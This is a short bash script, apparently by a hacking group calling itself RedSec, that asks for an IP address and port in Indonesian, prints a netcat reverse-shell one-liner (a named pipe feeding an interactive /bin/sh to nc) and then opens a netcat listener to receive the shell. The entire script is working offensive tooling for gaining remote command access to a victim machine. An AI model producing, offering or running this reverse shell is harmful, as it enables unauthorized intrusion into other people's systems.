#!/bin/bash

clear
toilet -f future Msec NC
echo "Create By ./RedSec"
echo "======================"
echo "Remember Msec :)"
echo "======================"
echo
read -p "Masukan Local IP = " int1
read -p "Masukan Port ( Bebas ) = " int2
echo "SHELL ELU : rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $int1 $int2 >/tmp/f"
nc -lnvp $int2
